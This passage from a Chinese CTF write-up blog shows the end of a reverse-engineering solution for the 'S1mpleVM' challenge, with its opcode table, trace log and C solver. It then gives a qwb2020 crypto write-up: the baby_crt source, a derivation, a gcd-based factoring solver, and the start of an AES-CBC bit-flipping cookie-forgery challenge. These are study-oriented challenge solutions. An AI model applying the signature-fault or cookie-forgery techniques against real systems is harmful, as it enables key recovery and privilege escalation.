*)j__malloc_base(0x10uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        goto LABEL_53;</span><br><span class="line">      case 1u:</span><br><span class="line">        //...</span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + 1) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p>
<ul>
<li>0：取模操作（先弹出的值在运算符左侧）</li>
<li>1：push 操作</li>
<li>2：pop 操作</li>
<li>3：乘法操作</li>
<li>4：加法操作</li>
<li>5：输出</li>
<li>6：取输入指针</li>
<li>7：右移位后取最低位（先弹出的值在运算符右侧）</li>
<li>8：异或操作</li>
<li>9：输入指针+1</li>
<li>10：返回</li>
<li>11：减法操作（先弹出的值在运算符左侧）</li>
<li>12：除法操作（先弹出的值在运算符左侧）</li>
</ul>
<p>运行根据程序写的cpp文件，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o test</span><br><span class="line">./test</span><br><span class="line">./test &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>节选一段log：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure>

<p>最前面输出了一句话：Thank for providing passcode, my ultimate secret box is checking…</p>
<p>跳过之后，发现它在频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>。这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure>

<p>得到权值的方法：在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p>
<p>得到异或目标值：在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code></p>
<p>看log的最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure>

<p>计算的第一个异或值，在最后被加起来返回了。</p>
<p>最终根据逻辑，写出还原 passcode 的逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char v[]=&#123;</span><br><span class="line">2,3,67,37,41,11,13,89,2,3,67,5,7,47,61,29,2,67,37,7,43,11,13,31,97,3,41,73,11,13,53,29,97,67,3,11,43,13,47,83,67,5,37,71,7,11,89,29,2,3,5,11,13,83,53,61,2,3,7,71,43,83,29,31,7,73,11,13,53,89,29,31,2,3,5,37,7,43,13,61,2,5,7,43,11,13,53,89,5,7,73,43,11,13,59,31,3,5,73,41,43,13,83,89,2,7,71,11,43,13,29,61,2,5,7,11,13,79,47,83,3,67,37,5,73,11,13,61,2,67,5,7,71,11,13,61,67,3,5,37,43,11,13,61,2,3,37,7,71,41,11,29,3,5,41,11,43,47,53,29,2,3,7,71,43,13,47,79,2,3,5,37,11,43,13,79,97,67,5,37,7,41,11,61,3,71,7,43,11,79,53,61,2,3,71,73,11,13,61,31,97,2,3,67,5,11,13,83,2,3,5,37,7,41,11,53,2,3,73,43,11,13,53,61,2,67,3,37,7,11,47,59,2,37,5,73,13,47,53,59,2,67,71,73,41,11,13,89,2,3,67,37,73,11,43,59,&#125;;</span><br><span class="line">char target[]=&#123;70,56,70,77,74,90,87,82,60,67,86,95,64,94,85,66,33,69,64,98,67,71,94,93,90,32,65,82,68,65,93,96,&#125;;</span><br><span class="line">int checkval(int i,int pos)&#123;</span><br><span class="line">	int sum=0;</span><br><span class="line">	for(int j=0;j&lt;8;j++)&#123;</span><br><span class="line">		sum+=((i&gt;&gt;j)&amp;1)*v[j+pos*8];</span><br><span class="line">	&#125;</span><br><span class="line">	return sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	for(size_t i=0;i&lt;sizeof(target);i++)&#123;</span><br><span class="line">		for(int j=0x20;j&lt;127;j++)&#123;</span><br><span class="line">			if(target[i]==checkval(j,i))&#123;</span><br><span class="line">				putchar(j);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span><br></pre></td></tr></table></figure>

<p><img src="/image-20251107213047428.png" alt="image-20251107213047428"></p>
<p>输入得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/11/17/S1mpleVM/" data-id="cuidrYGxsG84V-ZbXrAA45G9N" data-title="S1mpleVM" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2020-crypto" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/18/qwb2020-crypto/" class="article-date">
  <time class="dt-published" datetime="2024-01-18T03:18:11.000Z" itemprop="datePublished">2024-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/18/qwb2020-crypto/">qwb2020-crypto</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="baby-crt"><a href="#baby-crt" class="headerlink" title="baby_crt"></a>baby_crt</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, getStrongPrime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_t</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t = getPrime(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> t % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> libnum.gcd(d, t - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">m, params</span>):</span><br><span class="line">    d, p, q, n, t1, t2, e1, e2 = params</span><br><span class="line">    dp = d % ((p - <span class="number">1</span>) * (t1 - <span class="number">1</span>))</span><br><span class="line">    dq = d % ((q - <span class="number">1</span>) * (t2 - <span class="number">1</span>))</span><br><span class="line">    k = getPrime(<span class="number">16</span>)</span><br><span class="line">    Sp = <span class="built_in">pow</span>(m + k, dp, p * t1)</span><br><span class="line">    Sq = <span class="built_in">pow</span>(m, dq, q * t2)</span><br><span class="line">    Cp = q * t2 * libnum.invmod(q * t2, p * t1)</span><br><span class="line">    Cq = p * t1 * libnum.invmod(p * t1, q * t2)</span><br><span class="line">    S = (Cp * Sp + Cq * Sq) % (n * t1 * t2)</span><br><span class="line">    c1 = (m - <span class="built_in">pow</span>(S, e1, t1) + <span class="number">1</span>) % t1</span><br><span class="line">    c2 = (m - <span class="built_in">pow</span>(S, e2, t2) + <span class="number">1</span>) % t2</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(S, c1 * c2, n)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> p &lt; q</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&quot;flag&#123;&quot;</span> + sha1(long_to_bytes(p)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">t1 = gen_t(d)</span><br><span class="line">et1 = libnum.invmod(d, t1 - <span class="number">1</span>)</span><br><span class="line">t2 = gen_t(d)</span><br><span class="line">et2 = libnum.invmod(d, t2 - <span class="number">1</span>)</span><br><span class="line">params = (d, p, q, n, t1, t2, et1, et2)</span><br><span class="line">m = randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">sig = sign(m, params)</span><br><span class="line"><span class="built_in">print</span>(sig)</span><br></pre></td></tr></table></figure>

<p>先捋一下逻辑，输出了三个参数，n、m、sig，也就是output0中的三个数。</p>
<p>对于n，直接利用<a target="_blank" rel="noopener" href="https://factordb.com/%E5%88%86%E8%A7%A3%EF%BC%8C%E5%8F%AF%E7%9B%B4%E6%8E%A5%E5%BE%97%E5%88%B0p%E3%80%81q">https://factordb.com/分解，可直接得到p、q</a>(p&lt;q)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 149580444233086025790179573414856711556292635219028492250676309233306926698347672114881938858364663009604584293251087505211665595084567645013671843742930965283973691725982783226085450276850737892819830479107029360437303876681309102929919702367620122904659518881851295355796994990602745486313662851309278333637</span><br><span class="line">q = 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281</span><br></pre></td></tr></table></figure>

<p>不利用网站，分析一下数学原理：</p>
<p>已知n、e、m、sig，sig由函数sign生成，m∈[1,n-1]是随机整数</p>
<p>已知n，对于d，可知</p>
<p>$$e*d\equiv 1 \mod \phi(n)\ \phi(n)&#x3D;(p-1)(q-1)$$</p>
<p>t&#x3D;t1、t2由函数gen_t(d)生成，对于gen_t(d)，可知，t1、t2是16比特的素数（题目为二进制形式）</p>
<p>$$t ≡ 3 \mod 4\ \gcd(d,t-1)$$</p>
<p>对于et&#x3D;et1、et2，有</p>
<p>$$et*d \equiv 1 \mod (t-1)$$</p>
<p>接下来用d, p, q, n, t1, t2, et1, et2对消息m进行签名，得到sig &#x3D; sign(m, params)。</p>
<p>对于sign(m, params)，可知，k也是16比特的素数</p>
<p>$$\begin{aligned} dp &amp;\equiv d \mod \phi(p<em>t1)\ dq &amp;\equiv d \mod \phi(q</em>t2)\ Sp &amp;\equiv (m+k)^{dp} \mod (p<em>t1)\ Sq &amp;\equiv m^{dq} \mod (q</em>t2)\ Cp &amp;\equiv q<em>t2</em>((q<em>t2)^{-1}\mod (p</em>t1))\ Cq &amp;\equiv p<em>t1</em>((p<em>t1)^{-1}\mod (q</em>t2))\ S &amp;\equiv Cp<em>Sp+Cq</em>Sq \mod (p<em>q</em>t1<em>t2)\ c1 &amp;\equiv m-S^{et1} +1 \mod t1\ c2 &amp;\equiv m-S^{et2} +1 \mod t2\ sig &amp;\equiv S^{c1</em>c2} \mod n\ \end{aligned}$$</p>
<p>对于Sp、Sq、Cp、Cq、S，考虑中国剩余定理：</p>
<p>$$x ≡ \sum_{i&#x3D;1}^{n}(a_i * M&#x2F;m_i * [(M&#x2F;m_i)^{-1}\pmod {m_i}]) \pmod M,\ M&#x3D;\prod_{i&#x3D;1}^n{m_i},\ \begin{cases}    x ≡ a_1 \pmod {m_1} \    x ≡ a_2 \pmod {m_2} \     …\    x ≡ a_n \pmod {m_n}  \end{cases}$$</p>
<p>因此可得</p>
<p>$$S \equiv Sp \mod(p<em>t1)\ S \equiv Sq \mod(q</em>t2)$$</p>
<p>而模运算具备性质</p>
<p>$$若a ≡ b \mod (m*n),\ 则a ≡ b \mod m,a ≡ b \mod n$$</p>
<p>那么可得到</p>
<p>$$\begin{aligned} S &amp;\equiv (m+k)^{dp} \mod p\ S &amp;\equiv (m+k)^{dp} \mod t1\ S &amp;\equiv m^{dq} \mod q\ S &amp;\equiv m^{dq} \mod t2\ dp &amp;\equiv d \mod (p-1)\ dp &amp;\equiv d \mod (t1-1)\ dq &amp;\equiv d \mod (q-1)\ dq &amp;\equiv d \mod (t2-1)\ et1 &amp;\equiv d^{-1} \mod (t1-1)\ et2 &amp;\equiv d^{-1} \mod (t2-1) \end{aligned}$$</p>
<p>那么由</p>
<p>$$\begin{aligned} S &amp;\equiv (m+k)^{dp} \mod t1\ dp &amp;\equiv d \mod (t1-1)\ et1 &amp;\equiv d^{-1} \mod (t1-1)\ \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} S^{et1} \mod t1 &amp;\equiv (m+k)^{dp<em>et1} \mod t1 \ &amp;\equiv (m+k)^{d</em>d^{-1} \mod (t1-1)} \mod t1 \ &amp;\equiv m+k \mod t1 \ \end{aligned}$$</p>
<p>同理，由</p>
<p>$$\begin{aligned} S &amp;\equiv m^{dp} \mod t2\ dq &amp;\equiv d \mod (t2-1)\ et2 &amp;\equiv d^{-1} \mod (t2-1) \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} S^{et2} \mod t1 &amp;\equiv m^{dq<em>et2} \mod t2 \ &amp;\equiv m^{d</em>d^{-1} \mod (t2-1)} \mod t2 \ &amp;\equiv m \mod t2 \ \end{aligned}$$</p>
<p>因此根据</p>
<p>$$\begin{aligned} S^{et1} \mod t1 &amp;\equiv m+k \mod t1 \ S^{et2} \mod t1 &amp;\equiv m \mod t2 \ \end{aligned}$$</p>
<p>可得</p>
<p>$$\begin{aligned} c1 &amp;\equiv m-S^{et1} +1 \mod t1\ &amp;\equiv m-(m+k+a<em>t1)+1 \mod t1\ &amp;\equiv 1-k \mod t1 \ &amp;&#x3D;1-k+a</em>t1\ c2 &amp;\equiv m-S^{et2} +1 \mod t2\ &amp;\equiv m-(m+b*t2)+1 \mod t2\ &amp;\equiv 1 \mod t2\ \end{aligned}$$</p>
<p>那么取c2&#x3D;1，将S化简为Sq mod q（Sq未知量少），并根据上面的式子可推导</p>
<p>$$\begin{aligned} sig &amp;\equiv S^{c1<em>c2} \mod n\ &amp;\equiv S^{1-k+a</em>t1} \mod n \ &amp;\equiv S_q^{1-k+a<em>t1} \mod q \ &amp;\equiv S_q \mod q\ sig^e &amp;\equiv S_q^e \mod q\ &amp;\equiv m^{dq</em>e} \mod q\ &amp;\equiv m^{1 \mod q-1} \mod q\ &amp;\equiv m^{1+c(q-1)} \mod q\ &amp;\equiv m \mod q\ sig^e &amp;\equiv S_q^{e*(1-k+a<em>t1)} \mod q\ &amp;\equiv m^{1-k+a</em>t1} \mod q \end{aligned}$$</p>
<p>也就是说，可以通过求最大公约数得到q</p>
<p>$$m^{1-k+a<em>t1}-sig^e|q\ \Rightarrow \gcd((m^{1-k+a</em>t1}-sig^e),n)&#x3D;q≠1$$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">n = <span class="number">26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span></span><br><span class="line">m = <span class="number">26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540</span></span><br><span class="line">sig = <span class="number">20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">sig_e_1 = <span class="built_in">pow</span>(sig,e,n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    sig_e_2 = <span class="built_in">pow</span>(m,i,n)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd((sig_e_2-sig_e_1),n) !=<span class="number">1</span>:</span><br><span class="line">        q = gmpy2.gcd((sig_e_2-sig_e_1)%n,n)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">assert</span> p * q == n</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        flag = sha1(long_to_bytes(p)).hexdigest()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="modestudy"><a href="#modestudy" class="headerlink" title="modestudy"></a>modestudy</h1><blockquote>
<p>AES</p>
<p>1、2 、6 CBC    比特翻转攻击    选择密文攻击、IV预测     padding oracle attack</p>
<p>3 、4、5 ECB    如果有几个相同的明文组，那么密文也将有几个相同的片段   选择明文攻击    加密图片</p>
<p>CTR   nonce重用</p>
</blockquote>
<h2 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[$</span><span class="language-bash">] challenge 1</span></span><br><span class="line">[+] cookie:session=6b1f33a78c5b9c17;admin=0;checksum=552ebbeb9276a8cd9f741b7d29f8c9e1eb455757207ac420659e7eab56ddee25</span><br><span class="line">[+] checksum=aes128cbc.encrypt(session=6b1f33a78c5b9c17;admin=0)</span><br><span class="line">[+] only admin can see flag</span><br><span class="line">[-] cookie:（待输入）</span><br></pre></td></tr></table></figure>

<p>AES分块，每块都是128bits。</p>
<p>AES-CBC加解密如下：</p>
<p>$$Cᵢ &#x3D; Encrypt(Pᵢ ⊕ Cᵢ₋₁)\ Pᵢ &#x3D; Decrypt(Cᵢ) ⊕ Cᵢ₋₁$$</p>
<p><img src="/1763435936656-12.png" alt="img"></p>
<p><img src="/1763435936651-1.png" alt="img"></p>
<p><img src="/1763435936651-2.png" alt="img"></p>
<p>伪造一个合适的checksum，使得解密后admin&#x3D;1。</p>
